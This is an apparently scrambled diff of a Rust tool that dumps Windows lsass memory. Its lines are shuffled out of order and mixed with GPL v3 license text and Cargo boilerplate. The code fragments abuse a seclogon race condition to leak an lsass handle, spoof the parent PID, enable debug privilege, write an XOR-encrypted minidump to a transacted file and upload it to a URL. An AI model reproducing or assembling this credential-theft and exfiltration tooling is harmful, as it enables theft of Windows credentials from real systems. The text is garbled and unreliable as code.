@@ -1,0 +1,2031 @@
+    
+      
+       
+        
+           
+            
+               
+                
+                    
+                        
+                           
+                            
+                               
+                                
+                                  
+                                       
+                                        .send(read)
+                                        domain.as_ptr() as 
+                                    .collect()
+                                    .map(char::from)
+                                    .sample_iter(
+                                    .take(16)
+                                    0
+                                    continue
+                                    h = h.add(1)
+                                    key_ptr = key_ptr.add(1)
+                                    let _ = ureq::post(url)
+                                    let _r = dinvoke::close_handle(
+                                    let _r = dinvoke::close_handle(handle).unwrap()
+                                    let _r = dinvoke::close_handle(transacted_file_handle).unwrap()
+                                    let _r = dinvoke::close_handle(transaction_handle).unwrap()
+                                    let _r = file.write(holder.as_slice()).unwrap()
+                                    let boundary: 
+                                    let holder: Vec<u8> = vec![0
+                                    let mut data = Vec::new()
+                                    let mut file = std::fs::File::create(
+                                    let mut h: 
+                                    let rand_boundary: String = thread_rng()
+                                    let read = Cursor::new(
+                                    map_handle = z
+                                    ptr::null_mut()
+                                    shtei = shtei.add(1)
+                                    std::ptr::copy_nonoverlapping(view_xor.as_ptr() as 
+                                    view_ptr = view_ptr.add(1)
+                                    view_xor.push(
+                                    xor_key = xor_key 
+                                )
+                                .collect()
+                                .map(char::from)
+                                .sample_iter(
+                                .take(7)
+                                0
+                                0x100 
+                                0x80000000 
+                                continue
+                                description
+                                else
+                                for _i in 0..dump_size
+                                if z.0 == -1 
+                                image_name.push(
+                                key_ptr = key_ptr.add(1)
+                                let _r = dinvoke::close_handle(
+                                let _r = dinvoke::close_handle(handle).unwrap()
+                                let _r = dinvoke::close_handle(map_handle).unwrap()
+                                let _r = dinvoke::close_handle(transacted_file_handle).unwrap()
+                                let _r = dinvoke::close_handle(transaction_handle).unwrap()
+                                let _ret = dinvoke::rollback_transaction(transaction_handle)
+                                let _unmap = dinvoke::unmap_view_of_file(ret)
+                                let dump_size = dinvoke::get_file_size(
+                                let error = dinvoke::get_last_error()
+                                let map_handle: HANDLE
+                                let mut key_ptr = key.as_ptr()
+                                let mut view_ptr = ret as 
+                                let mut view_xor: Vec<u8> = vec![]
+                                let mut xor_key: u8 = 
+                                let rand_string: String = thread_rng()
+                                let ret = dinvoke::map_view_of_file(
+                                let z = dinvoke::create_file_mapping(
+                                ptr::null_mut()
+                                return
+                                shtei = shtei.add(1)
+                                transacted_file_handle = z
+                                transaction_handle = z
+                                while 
+                                {
+                                {           
+                                }
+                            (
+                            )
+                            .collect()
+                            .map(char::from)
+                            .sample_iter(
+                            .take(20)
+                            // This is required due to Rust optimizations in order to keep the handle active.
+                            // We need to upgrade our lsass handle to full accesss in order to be able to dump the memory content
+                            // We use the duplicated handle to dump the process memory
+                            Preamble
+                            buff = buff.add(1)
+                            continue
+                            dup_handle = full_access_handle
+                            else
+                            else 
+                            if 
+                            if x != 0 
+                            if x == 1 
+                            if z.0 == -1 
+                            let _r = dinvoke::close_handle(
+                            let _r = dinvoke::close_handle(handle).unwrap()
+                            let dup_handle: 
+                            let f = HANDLE::default()
+                            let file_name = file_name.as_ptr() as 
+                            let full_access_handle: 
+                            let m = 0xffffu32
+                            let mini: 
+                            let new_handle = HANDLE { 0: temp}
+                            let rand_string: String = thread_rng()
+                            let transacted_file_handle: HANDLE
+                            let transaction_handle: HANDLE
+                            let x = dinvoke::mini_dump_write_dump(
+                            let x = dinvoke::nt_duplicate_object(
+                            let z = dinvoke::create_file_transacted(
+                            let z = dinvoke::create_transaction(
+                            ret_len
+                            shtei = shtei.add(1)
+                            type_name.push(
+                            {
+                            {                                
+                            }
+                            }                           
+                        )
+                        // We have a valid process handled
+                        break
+                        buffer = buffer.add(1)
+                        bytes = 
+                        continue
+                        desired_access = 0
+                        for _i in 0..(
+                        if 
+                        if image_name.contains(
+                        if leak
+                        if z == 0 
+                        let _r = dinvoke::close_handle(
+                        let _r = dinvoke::close_handle(handle).unwrap()
+                        let buffer = vec![0u8
+                        let buffer: 
+                        let len = 500usize
+                        let mut buff: 
+                        let ret_len: 
+                        let temp = (
+                        let z = dinvoke::query_full_process_image_name(
+                        options
+                        options = 0x00000002
+                        ret_lenght
+                        shtei = shtei.add(1)
+                        tbi = std::mem::transmute(ptr)
+                        through a race condition.
+                        {
+                        {             
+                        {                         
+                        }
+                       TERMS AND CONDITIONS
+                     END OF TERMS AND CONDITIONS
+                    )
+                    // Duplicate handle in order to manipulate it
+                    // Get current thread's basic information
+                    // We have a process handle
+                    // We obtain information about the handle. Two calls to NtQueryObject are required in order to make it work.
+                    GNU GENERAL PUBLIC LICENSE
+                    buffer =  vec![0u8
+                    c = c 
+                    client_id
+                    continue
+                    else
+                    for _i in 0..poti.TypeName.Length
+                    fun_name = ptr::null_mut()
+                    handle = 
+                    if c > 20
+                    if leak
+                    if x != 0 
+                    let _ = dinvoke::nt_query_object(
+                    let _r = dinvoke::close_handle(
+                    let buffer = vec![0u8
+                    let bytes_ptr: 
+                    let h = HANDLE::default()
+                    let l = u32::default()
+                    let mut buffer: 
+                    let mut desired_access: u32 = 0x0400
+                    let mut dup_handle: 
+                    let mut options: u32 = 0
+                    let poti = 
+                    let poti = PUBLIC_OBJECT_TYPE_INFORMATION::default()
+                    let poti_ptr: 
+                    let poti_ptr: PVOID = std::mem::transmute(
+                    let poti_ptr: PVOID = std::mem::transmute(buffer.as_ptr())
+                    let re = 0u32
+                    let ret_lenght: 
+                    let target = HANDLE {0: (
+                    let x = dinvoke::nt_duplicate_object(
+                    let x = dinvoke::nt_query_object(
+                    ptr = std::mem::transmute(buffer.as_ptr())
+                    result = 
+                    shtei = shtei.add(1)
+                    {
+                    }
+                (
+                )
+                // 0x00000002 = LOGON_NETCREDENTIALS_ONLY 
+                // Access denied error pops if this pointer is not liberated.
+                // PROCESS_DUP_HANDLE as access right
+                // TEB pid spoofing
+                break
+                bytes 
+                domain.push(0)
+                else 
+                file.push(0)
+                fpi = std::mem::transmute(ptr)
+                function_name.push(
+                function_name_ptr = function_name_ptr.add(1)
+                function_ptr = (module_base_address 
+                if handle.0 != 0 
+                if ret == 0
+                if x == 0
+                let _create_process_with_logon_r: Option<BOOL>
+                let _r = dinvoke::close_handle(file_handle)
+                let _r = dinvoke::close_handle(handle).unwrap()
+                let adv = dinvoke::get_module_base_address(
+                let client_id = CLIENT_ID {UniqueProcess: HANDLE{0:(
+                let client_id: 
+                let create_process_with_logon: data::CreateProcessWithLogon
+                let dst_ptr: 
+                let func_ptr: LdrGetProcedureAddress = std::mem::transmute(function_address)
+                let function_name = PSTR{0: name.as_ptr() as 
+                let function_ordinal = 
+                let function_ptr: CloseHandle = std::mem::transmute(function_address)
+                let function_ptr: LoadLibraryA = std::mem::transmute(function_address)
+                let function_ptr: OpenProcess = std::mem::transmute(function_address)
+                let function_rva = 
+                let h = HANDLE::default()
+                let handle
+                let handle_ptr: 
+                let hmodule: PVOID = std::mem::transmute(module_handle)
+                let mut buffer
+                let mut bytes = 48u32
+                let mut c = 0
+                let mut fun_name: 
+                let mut ptr: PVOID
+                let o = OBJECT_ATTRIBUTES::default()
+                let object_attributes: 
+                let p = PROCESS_INFORMATION::default()
+                let process_information: 
+                let return_address: 
+                let spoofed_pid = get_pid_from_image_path(
+                let src_ptr: 
+                let startup = vec![0u8
+                let startupinfo: 
+                let tbi: 
+                let teb: 
+                let x = dinvoke::nt_open_process(
+                loop
+                pass.push(0)
+                result = function_ptr(function_name)
+                ret = function_ptr(handle)
+                return (
+                shi = std::mem::transmute(ptr)
+                username.push(0)
+                {
+                { 
+                }
+                }     
+            $c = std::mem::transmute(function_ptr)
+            $d = None
+            $d = Some($c($($e)
+            // 47 = FileProcessIdsUsingFileInformation
+            // Query the system looking for handles information
+            How to Apply These Terms to Your New Programs
+            buffer =  vec![0u8
+            buffer_ptr = buffer_ptr.add(1)
+            c = c 
+            else
+            else 
+            file_content.push(
+            force = true
+            force_leakage()
+            if (
+            if c > 20
+            if counter % 10000 == 0 
+            if function_address != 0 
+            if function_name.to_lowercase() == function.to_lowercase() 
+            if x != 0 
+            key_ptr = key_ptr.add(1)
+            let address = 
+            let bytes_ptr: 
+            let handle = m.handle()
+            let mut function_name_ptr = (module_base_address 
+            p_export = opt_header 
+            ptr = std::mem::transmute(buffer.as_ptr())
+            ret = function_ptr as isize
+            return
+            return handle as isize
+            shtei = shtei.add(1)
+            target_pid = get_pid_from_image_path(
+            while 
+            xor_key = xor_key 
+            {
+            { 
+            }
+           return Ok(false)
+        --decrypt       Decrypt a previously generated dump file.
+        --dump          Dump lsass.
+        // 0x00000001
+        // 0x40000000 = FILE_FLAG_OVERLAPPED
+        // 0x80 = FILE_READ_ATTRIBUTES
+        // 3 = OPEN_EXISTING
+        // 997 = ERROR_IO_PENDING
+        //Enable SeDebugPrivilee
+        0
+        OVERLAPPED {
+        OVERLAPPED0 {
+        Ok(())
+        Ok(handle)
+        Ok(m) => { m }
+        Ok(result)
+        Ok(result.0 as isize)
+        PeMetadata {
+        Windows::Win32::System::WindowsProgramming::IO_STATUS_BLOCK
+        dumper::decrypt(
+        dumper::dump(
+        else
+        else 
+        entry_point = module_base_address 
+        file.push(0)
+        file.read_to_end(
+        for _i in 0..metadata.len()
+        for counter in 0..(
+        for x in 0..number_of_names 
+        if !get_overlapped_result_r.unwrap().as_bool()
+        if !ret.as_bool()
+        if function_ptr != 0
+        if function_ptr != ptr::null_mut()
+        if get_last_error_r.unwrap() != 997
+        if leak
+        if m.name().unwrap().to_lowercase() == module_name.to_ascii_lowercase()
+        if magic == 0x010b 
+        if module_base_address != 0
+        if r != 0 
+        input_buffer.flags = 0x00000001
+        input_buffer.requested_oplock_level = 0x00000001 
+        input_buffer.structure_length = size_of::<REQUEST_OPLOCK_INPUT_BUFFER>() as u16
+        input_buffer.structure_version = 1
+        key_ptr = key_ptr.add(1)
+        let _r = dinvoke::close_handle(file_handle)
+        let _r = output.write_all(
+        let _r: Option<BOOL>
+        let bytes_ret: 
+        let create_event: data::CreateEvent
+        let create_event_r: Option<HANDLE>
+        let create_file: data::CreateFile
+        let create_file_r: Option<HANDLE>
+        let current_thread: u8 = 0
+        let d = u32::default()
+        let dbg = load_library_a(
+        let device_oi_control: data::DeviceIoControl
+        let dw_bytes: 
+        let enable: u8 = 1
+        let enabled: 
+        let export_rva = 
+        let file_handle = create_file_r.unwrap()
+        let fpi: 
+        let fsctl_request_oplockc = ((0x00000009)<<16) 
+        let func_ptr: data::CreateFileMapping
+        let func_ptr: data::CreateFileTransactedA
+        let func_ptr: data::CreateTransaction
+        let func_ptr: data::GetFileSize
+        let func_ptr: data::GetLastError
+        let func_ptr: data::MapViewOfFile
+        let func_ptr: data::MiniDumpWriteDump
+        let func_ptr: data::NtAllocateVirtualMemory
+        let func_ptr: data::NtDuplicateObject
+        let func_ptr: data::NtOpenProcess
+        let func_ptr: data::NtProtectVirtualMemory
+        let func_ptr: data::NtQueryInformationFile
+        let func_ptr: data::NtQueryInformationProcess
+        let func_ptr: data::NtQueryObject
+        let func_ptr: data::NtQuerySystemInformation
+        let func_ptr: data::NtWriteVirtualMemory
+        let func_ptr: data::QueryFullProcessImageNameW
+        let func_ptr: data::RollbackTransaction
+        let func_ptr: data::RtlAdjustPrivilege
+        let func_ptr: data::SetHandleInformation
+        let func_ptr: data::UnmapViewOfFile
+        let functions_rva = 
+        let get_last_error_r: Option<u32>
+        let get_overlapped_result: data::GetOverlappedResult
+        let get_overlapped_result_r: Option<BOOL>
+        let handle
+        let input: PVOID = std::mem::transmute(
+        let ios: Vec<u8> = vec![0u8
+        let iosb: 
+        let k32 = dinvoke::get_module_base_address(
+        let kernel32 = get_module_base_address(
+        let ktmv = load_library_a(
+        let lsass_pid = get_pid_from_image_path(
+        let magic = 
+        let main: EntryPoint = std::mem::transmute(entry_point)
+        let metadata = fs::metadata(file_path).unwrap()
+        let module = HINSTANCE {0: entry_point as isize}
+        let module_base_address = get_module_base_address(
+        let mut buffer
+        let mut buffer = vec![]
+        let mut buffer_ptr = buffer.as_ptr().add(1)
+        let mut bytes = 0x10000
+        let mut bytes = size_of::<FILE_PROCESS_IDS_USING_FILE_INFORMATION>() as u32
+        let mut c = 0
+        let mut file: Vec<u16> = path.encode_utf16().collect()
+        let mut file_content: Vec<u8> = vec![]
+        let mut function_ptr:
+        let mut input_buffer = REQUEST_OPLOCK_INPUT_BUFFER::default()
+        let mut key_ptr = key.as_ptr()
+        let mut output = std::fs::File::create(output_file).unwrap()
+        let mut output_buffer = REQUEST_OPLOCK_OUTPUT_BUFFER::default()
+        let mut overlapped: OVERLAPPED = OVERLAPPED::default()
+        let mut ptr: PVOID
+        let mut result: isize = 0
+        let mut ret: isize = 0
+        let mut shtei: 
+        let mut target_pid = 0u16
+        let mut xor_key: u8 = 
+        let names_rva = 
+        let ntdll = get_module_base_address(
+        let number_of_names = 
+        let opt_header: isize = module_base_address 
+        let ordinal_base = 
+        let ordinals_rva = 
+        let output: PVOID = std::mem::transmute(
+        let over: 
+        let p_export: isize
+        let pe_header = 
+        let privilege: u32 = 20
+        let result
+        let ret
+        let ret = $crate::call_module_entry_point(
+        let ret: Option<BOOL>
+        let ret: Option<HANDLE>
+        let ret: Option<PVOID>
+        let ret: Option<u32>
+        let shi: 
+        let unsued = 0u32
+        loop
+        match ret {
+        output_buffer.structure_length = size_of::<REQUEST_OPLOCK_OUTPUT_BUFFER>() as u16
+        output_buffer.structure_version = 1
+        overlapped.event_handle = create_event_r.unwrap()
+        print_usage(
+        pub datas_directory: [IMAGE_DATA_DIRECTORY
+        ret
+        return
+        thread::spawn(
+        while 
+        {
+        { 
+        }
+        } 
+        }     
+        })
+       Ok(true)
+       if ret == 0
+       {
+       }
+    (at your option) any later version.
+    )
+    0
+    7.  This requirement modifies the requirement in section 4 to
+    <one line to give the program's name and a brief idea of what it does.>
+    <program>  Copyright (C) <year>  <name of author>
+    Appropriate Legal Notices
+    Copyright (C) <year>  <name of author>
+    Corresponding Source along with the object code.  If the place to
+    Corresponding Source fixed on a durable physical medium
+    Corresponding Source from a network server at no charge.
+    Corresponding Source in the same way through the same place at no
+    Corresponding Source.  Regardless of what server hosts the
+    GNU General Public License for more details.
+    License to anyone who comes into possession of a copy.  This
+    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+    Notices displayed by works containing it
+    Source of the work are being offered to the general public at no
+    This program comes with ABSOLUTELY NO WARRANTY
+    This program is free software: you can redistribute it and/or modify
+    You should have received a copy of the GNU General Public License
+    a) Disclaiming warranty or limiting liability differently from the
+    a) The work must carry prominent notices stating that you modified
+    any liability that these contractual assumptions directly impose on
+    author attributions in that material or in the Appropriate Legal
+    authors of the material
+    available for as long as needed to satisfy these requirements.
+    b) Requiring preservation of specified reasonable legal notices or
+    b) The work must carry prominent notices stating that it is
+    but WITHOUT ANY WARRANTY
+    c) Convey individual copies of the object code with a copy of the
+    charge under subsection 6d.
+    clear directions next to the object code saying where to find the
+    copy of the Corresponding Source for all the software in the
+    customarily used for software interchange.
+    d) Convey the object code by offering access from a designated
+    d) Limiting the use for publicity purposes of names of licensors or
+    e) Declining to grant rights under trademark law for use of some
+    else
+    else 
+    else if matches.opt_present(
+    f) Requiring indemnification of licensors and authors of that
+    fn default() -> OVERLAPPED {
+    fn default() -> OVERLAPPED0 {
+    fn default() -> PeMetadata {
+    for m in modules
+    further charge.  You need not require recipients to copy the
+    if matches.opt_present(
+    if pe_info.is_32_bit 
+    invalidate such permission if you have separately received it.
+    it under the terms of the GNU General Public License as published by
+    let args: Vec<String> = env::args().collect()
+    let entry_point: isize
+    let matches = match opts.parse(
+    let modules = process.module_list().unwrap()
+    let mut force = false
+    let mut opts = Options::new()
+    let process = Process::current()
+    let program = args[0].clone()
+    long as you offer spare parts or customer support for that product
+    match ret {
+    material by anyone who conveys the material (or modified versions of
+    may be on a different server (operated by you or a third party)
+    more than your reasonable cost of physically performing this
+    pub data4: [u8
+    pub pointer: 
+    pub process_id_list: [usize
+    pub sections: Vec<IMAGE_SECTION_HEADER> 
+    pub unused1: [u8
+    pub unused2: [u8
+    pub unused: [u8
+    reasonable ways as different from the original version
+    regardless of how they are packaged.  This License gives no
+    released under this License and any conditions added under section
+    requiring that modified versions of such material be marked in
+    start()
+    static_vcruntime::metabuild()
+    terms of sections 15 and 16 of this License
+    those licensors and authors.
+    under certain conditions
+    unsafe
+    unsafe 
+    unsafe{
+    windows::build!(
+    with subsection 6b.
+    work need not make them do so.
+    written offer to provide the Corresponding Source.  This
+    you inform other peers where the object code and Corresponding
+    {
+    {   
+    {    
+    }
+    } 
+    }   
+  0. Definitions.
+  0x00100000 
+  1. Source Code.
+  10. Automatic Licensing of Downstream Recipients.
+  11. Patents.
+  12. No Surrender of Others' Freedom.
+  13. Use with the GNU Affero General Public License.
+  14. Revised Versions of this License.
+  15. Disclaimer of Warranty.
+  16. Limitation of Liability.
+  17. Interpretation of Sections 15 and 16.
+  2. Basic Permissions.
+  3. Protecting Users' Legal Rights From Anti-Circumvention Law.
+  4. Conveying Verbatim Copies.
+  5. Conveying Modified Source Versions.
+  6. Conveying Non-Source Forms.
+  7. Additional Terms.
+  8. Termination.
+  9. Acceptance Not Required for Having Copies.
+  A compilation of a covered work with other separate and independent
+  All rights granted under this License are granted for the term of
+  Conveying under any other circumstances is permitted solely under
+  Developers that use the GNU GPL protect your rights with two steps:
+  Each version is given a distinguishing version number.  If the
+  IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING
+  If the Program specifies that a proxy can decide which future
+  If the disclaimer of warranty and limitation of liability provided
+  Later license versions may give you additional or different
+  No covered work shall be deemed part of an effective technological
+  Nothing in this License shall be construed as excluding or limiting
+  Some devices are designed to deny users access to install or run
+  Termination of your rights under this section does not terminate the
+  The Corresponding Source for a work in source code form is that
+  The Corresponding Source need not include anything that users
+  The Free Software Foundation may publish revised and/or new versions of
+  The GNU General Public License does not permit incorporating your program
+  The licenses for most software and other practical works are designed
+  The requirement to provide Installation Information does not include a
+  You are not required to accept this License in order to receive or
+  You may convey a covered work in object code form under the terms
+  You may convey verbatim copies of the Program's source code as you
+  You may not impose any further restrictions on the exercise of the
+  You may not propagate or modify a covered work except as expressly
+ ((0) <<14) 
+ ((144)<<2) 
+ (0)
+ (4 
+ (function_ordinal - ordinal_base)) as isize )) as 
+ (pe_header as isize) 
+ // DUPLICATE_SAME_ACCESS
+ // I dont really think it does exist a process image name longer than 500 characters
+ // OPLOCK_LEVEL_CACHE_READ 
+ // Ordinal 8 represents the function RtlDispatchAPC
+ // PROCESS_QUERY_INFORMATION 
+ // REQUEST_OPLOCK_CURRENT_VERSION
+ // REQUEST_OPLOCK_INPUT_FLAG_REQUEST
+ // The key thing you are missing
+ // dinvoke::dynamic_invoke(
+ //PROCESS_DUP_HANDLE access right.
+ 0x00000002
+ 0x10) as 
+ 0x18
+ 0x18) as 
+ 0x1C) as 
+ 0x20) as 
+ 0x24) as 
+ 0x3C) as 
+ 0x60
+ 0x70
+ 0xFFFF
+ 2 // Each char is followed by 
+ 2) as 
+ 4) as 
+ Compilation 
+ Description
+ Everyone is permitted to copy and distribute verbatim copies
+ Example - Calling a dll entry point
+ Example - Dynamically calling LoadLibraryA
+ Example - Dynamically calling with referenced arguments
+ Examples
+ FILE_SHARE_DELETE
+ FILE_SHARE_WRITE 
+ Generated by Cargo
+ More information here https://doc.rust-lang.org/cargo/guide/cargo-toml-vs-cargo-lock.html
+ OPLOCK_LEVEL_CACHE_HANDLE
+ PROCESS_VM_READ 
+ See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html
+ These are backup files generated by rustfmt
+ Usage
+ address as isize) as 
+ and each file should have at least
+ and give all
+ bytes as usize]
+ counter > 0
+ export_rva as isize 
+ filename=
+ for details type 
+ function_rva as isize) as 
+ functions_rva as isize 
+ handle.0 != -1
+ it applies also to
+ len]
+ mode and execute it:
+ name=
+ names_rva as isize 
+ ordinal_base
+ ordinals_rva as isize 
+ pe_info.opt_header_32.AddressOfEntryPoint as isize
+ pe_info.opt_header_64.address_of_entry_point as isize
+ return
+ section 10
+ size_of::<IO_STATUS_BLOCK>()]
+ target_pid == 0)
+ type 
+ will have compiled files and executables
+ will work.
+ without even the implied warranty of
+ x as isize 
+ xor_key)
+"                                        .set(""Content-Length"", data.len().to_string().as_str())"
+"                                        .set(""content-type"",cont_type.as_str()) "
+"                                        ptr::null(),ptr::null(),startupinfo,process_information)"
+"                                    0,"
+"                                    4, // FILE_MAP_READ"
+"                                    PAGE_READONLY,"
+"                                    let _ = write!(data, """
+"                                    let _ = write!(data, ""--{}"
+"                                    let _ = write!(data, ""--{}--"
+"                                    let _ = write!(data, ""Content-Disposition: form-data"
+"                                    let _ = write!(data, ""Content-Type: text/plain"
+"                                    let _ = write!(data, ""{}"", base64::encode("
+"                                    let cont_type = format!(""multipart/form-data"
+"                                    let output_path = format!(""{}{}"", rand_string, "".txt"")"
+"                                    map_handle,"
+"                                    println!(""{} {}."", "
+"                                    println!(""{}"", "
+"                                    ptr::null(),"
+"                                    transacted_file_handle,"
+"                                0,"
+"                                0x00000001, "
+"                                0x00000002, // MiniDumpWithFullMemory"
+"                                0x00000002,"
+"                                3,0,HANDLE {0: 0})"
+"                                GetCurrentProcess(),"
+"                                HANDLE::default(),"
+"                                THREAD_ALL_ACCESS, "
+"                                file_name,"
+"                                full_access_handle,"
+"                                if url == """""
+"                                let key = format!(""{}{}"", key, """
+"                                mini,"
+"                                output, size_of::<REQUEST_OPLOCK_OUTPUT_BUFFER>() as u32, bytes_ret, over)"
+"                                println!(""[x] Error: {error}"")"
+"                                println!(""{}"", "
+"                                println!(""{}"","
+"                                ptr::null(),"
+"                                ptr::null_mut(),"
+"                                transacted_file_handle,"
+"                                transaction_handle,"
+"                            0,"
+"                            buffer,"
+"                            let description = """
+"                            let file_name = format!(""."
+"                            println!(""{}."", "
+"                        0,"
+"                        2,"
+"                        GetCurrentProcess(),"
+"                        desired_access, "
+"                        dup_handle,"
+"                        handle,"
+"                        let mut image_name: String = """".to_string()"
+"                        poti_ptr,"
+"                        println!(""{}"", "
+"                        size_of::<PUBLIC_OBJECT_TYPE_INFORMATION>() as u32,"
+"                        target,"
+"                       Version 3, 29 June 2007"
+"                    // Therefore, we first duplicate the handle with the same access"
+"                    // lsass handle obtained from seclogon's race condition cant be upgraded directly, two steps are required"
+"                    0x0040,"
+"                    handle_ptr,"
+"                    if type_name.to_lowercase() == ""process"""
+"                    let mut type_name: String = """".to_string()"
+"                    let x = dinvoke::nt_query_information_thread(GetCurrentThread(), 0,ptr,bytes,bytes_ptr)"
+"                    object_attributes,"
+"                dinvoke::dynamic_invoke!(adv,"
+"                handle = function_ptr(desired_access,inherit_handle,process_id)"
+"                if function_name == """""
+"                let mut domain: Vec<u16> = lc!(""domain"").encode_utf16().collect()"
+"                let mut file: Vec<u16> = lc!(""c:"
+"                let mut pass: Vec<u16> = lc!(""password"").encode_utf16().collect()"
+"                let mut username: Vec<u16> = lc!(""username"").encode_utf16().collect()"
+"                let name = CString::new(module.to_string()).expect(""CString::new failed"")"
+"                let ret = func_ptr(hmodule, fun_name, ordinal, return_address)"
+"                let spoofed_pid = CLIENT_ID {UniqueProcess:HANDLE {0: spoofed_pid}, UniqueThread: ("
+"                println!(""  "
+"                println!(""{}"", "
+"                return Err(lc!(""[x] Error obtaining CloseHandle address.""))"
+"                return Err(lc!(""[x] Error obtaining LdrGetProcedureAddress address.""))"
+"                return Err(lc!(""[x] Error obtaining LoadLibraryA address.""))"
+"                return Err(lc!(""[x] Error obtaining OpenProcess address.""))"
+"                std::ptr::copy_nonoverlapping(src_ptr, dst_ptr, 1)"
+"            Err(_) => $c = false,"
+"            IMAGE_DATA_DIRECTORY,IMAGE_OPTIONAL_HEADER_MAGIC,IMAGE_SUBSYSTEM,MINIDUMP_EXCEPTION_INFORMATION,MINIDUMP_USER_STREAM_INFORMATION,"
+"            MINIDUMP_CALLBACK_INFORMATION},"
+"            None => return -1,"
+"            None => return 0,"
+"            None => return 0xf, "
+"            None => return HANDLE { 0: 0 } ,"
+"            None => return false ,"
+"            None => return ptr::null_mut() ,"
+"            Ok(_) => $c = true,"
+"            Some(x) => return x,"
+"            Some(x) => return x.as_bool(),"
+"            anonymous: OVERLAPPED0::default(),"
+"            anonymous: OVERLAPPED_0_0::default(), "
+"            event_handle: HANDLE::default(),  "
+"            image_file_header: IMAGE_FILE_HEADER::default(),"
+"            input = matches.opt_str(""i"").unwrap()"
+"            internal: 0usize,"
+"            internal_high: 0usize,"
+"            is_32_bit: false,"
+"            key = matches.opt_str(""k"").unwrap()"
+"            let function_address = get_function_address(module_base_address, "
+"            let function_address: isize = get_function_address(module_base_address, "
+"            let mut function_name: String = """".to_string()"
+"            let x = dinvoke::nt_query_information_file(file_handle, iosb,ptr,bytes,47)"
+"            let x = dinvoke::nt_query_system_information(16,ptr,bytes,bytes_ptr)"
+"            opt_header_32: IMAGE_OPTIONAL_HEADER32::default(),"
+"            opt_header_64: IMAGE_OPTIONAL_HEADER64::default(),"
+"            output = matches.opt_str(""o"").unwrap()"
+"            pe: u32::default(),"
+"            println!(""{}"", "
+"            println!(""{}"","
+"            return Err(lc!(""[x] Error obtaining kernel32.dll base address.""))"
+"            return Err(lc!(""[x] Error obtaining ntdll.dll base address.""))"
+"            return Err(lc!(""[x] Failed to call module's entry point (DllMain -> DLL_PROCESS_ATTACH).""))"
+"            sections: Vec::default(),  "
+"            upload = matches.opt_str(""u"").unwrap()"
+"        Err(_) => {print!(""{}"",lc!(""[x] Invalid arguments. Use -h for detailed help.""))"
+"        Windows::Win32::Foundation::{HANDLE,HINSTANCE,PSTR,BOOL},"
+"        Windows::Win32::Security::SECURITY_ATTRIBUTES,"
+"        Windows::Win32::System::Diagnostics::Debug::{IMAGE_FILE_HEADER,IMAGE_OPTIONAL_HEADER32,IMAGE_SECTION_HEADER,"
+"        Windows::Win32::System::Memory::{VIRTUAL_ALLOCATION_TYPE,PAGE_PROTECTION_FLAGS},"
+"        Windows::Win32::System::SystemServices::{IMAGE_BASE_RELOCATION,IMAGE_IMPORT_DESCRIPTOR,IMAGE_THUNK_DATA32,IMAGE_THUNK_DATA64},"
+"        Windows::Win32::System::Threading::{GetCurrentProcess,GetCurrentThread,PROCESS_BASIC_INFORMATION,STARTUPINFOW,PROCESS_INFORMATION},"
+"        Windows::Win32::System::WindowsProgramming::{PUBLIC_OBJECT_TYPE_INFORMATION,OBJECT_ATTRIBUTES,CLIENT_ID},"
+"        dinvoke::dynamic_invoke!(k32,"
+"        dynamic_invoke!(dbg,"
+"        dynamic_invoke!(kernel32,"
+"        dynamic_invoke!(ktmv,"
+"        dynamic_invoke!(module_base_address,"
+"        dynamic_invoke!(ntdll,"
+"        if matches.opt_present(""f"")"
+"        if matches.opt_present(""i"")"
+"        if matches.opt_present(""k"")"
+"        if matches.opt_present(""o"")"
+"        if matches.opt_present(""u"")"
+"        let function_ptr = $crate::get_function_address($a, $b)"
+"        let get_last_error: unsafe extern ""system"" fn () -> u32"
+"        let key = format!(""{}{}"", key, """
+"        let mut file = File::open(file_path).expect(""[x] Error opening input file."")"
+"        let mut file: Vec<u16> = lc!(""c:"
+"        let r = dinvoke::rtl_adjust_privilege(privilege,enable,current_thread,enabled)"
+"        let ret = main(module, DLL_PROCESS_ATTACH, ptr::null_mut())"
+"        print!(""{}"",lc!(""[x] Invalid arguments. Use -h for detailed help.""))"
+"        println!(""{}"", "
+"        println!(""{}{}{}"","
+"        pub address_of_entry_point: u32, "
+"        pub base_of_code: u32, "
+"        pub checksum: u32, "
+"        pub dll_characteristics: u16, "
+"        pub file_alignment: u32, "
+"        pub image_base: u64, "
+"        pub loader_flags: u32, "
+"        pub magic: u16, "
+"        pub major_image_version: u16,"
+"        pub major_linker_version: u8, "
+"        pub major_operating_system_version: u16, "
+"        pub major_subsystem_version: u16,"
+"        pub minor_image_version: u16, "
+"        pub minor_linker_version: u8, "
+"        pub minor_operating_system_version: u16, "
+"        pub minor_subsystem_version: u16, "
+"        pub number_of_rva_and_sizes: u32, "
+"        pub section_alignment: u32, "
+"        pub size_of_code: u32, "
+"        pub size_of_headers: u32, "
+"        pub size_of_heap_commit: u64, "
+"        pub size_of_heap_reserve: u64, "
+"        pub size_of_image: u32, "
+"        pub size_of_initialized_data: u32, "
+"        pub size_of_stack_commit: u64, "
+"        pub size_of_stack_reserve: u64, "
+"        pub size_of_unitialized_data: u32, "
+"        pub subsystem: u16, "
+"        pub win32_version_value: u32, "
+"    ""keep intact all notices""."
+"    ($a:expr, $b:expr, $c:expr) => {"
+"    ($a:expr, $b:expr, $c:expr, $d:expr, $($e:tt)"
+"    (including a physical distribution medium), accompanied by a"
+"    (including a physical distribution medium), accompanied by the"
+"    -f, --force         Force seclogon's service to leak a lsass handle"
+"    -h, --help          Print this help menu."
+"    -i, --input         Encrypted dump file [default: c:"
+"    -k, --key           Encryption key [default: 1234abcd]"
+"    -o, --output        Destination path [default: c:"
+"    -u, --upload        Upload URL"
+"    Corresponding Source, you remain obligated to ensure that it is"
+"    Err(_) => return 0, "
+"    HANDLE, "
+"    License will therefore apply, along with any applicable section 7"
+"    Ok(r) => return r,"
+"    This is free software, and you are welcome to redistribute it"
+"    This program is distributed in the hope that it will be useful,"
+"    a) Convey the object code in, or embodied in, a physical product"
+"    additional terms, to the whole of the work, and all its parts,"
+"    along with this program.  If not, see <https://www.gnu.org/licenses/>."
+"    alternative is allowed only occasionally and noncommercially, and"
+"    b) Convey the object code in, or embodied in, a physical product"
+"    c) Prohibiting misrepresentation of the origin of that material, or"
+"    c) You must license the entire work, as a whole, under this"
+"    conveying of source, or (2) access to copy the"
+"    copy the object code is a network server, the Corresponding Source"
+"    d) If the work has interactive user interfaces, each must display"
